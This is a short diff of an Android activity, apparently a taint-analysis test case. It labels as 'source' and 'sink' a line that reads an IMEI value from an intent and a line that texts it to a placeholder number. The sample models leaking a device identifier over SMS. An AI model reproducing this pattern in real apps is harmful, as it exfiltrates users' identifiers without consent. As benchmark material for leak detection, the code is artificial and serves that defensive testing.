@@ -34,10 +34,10 @@ public class Activity2 extends Activity {
 		che = "com.example.sms.send";
 		phoneNo = "555-4" ;
 		Intent im = getIntent();
-		value= getIntent().getExtras().getString("imei");
+		value= getIntent().getExtras().getString("imei"); // source
 		tv.setText(value);
 		SmsManager sm = SmsManager.getDefault();
-		sm.sendTextMessage(phoneNo, null, value,null, null);
+		sm.sendTextMessage(phoneNo, null, value,null, null); // sink
 		 
 	}
 
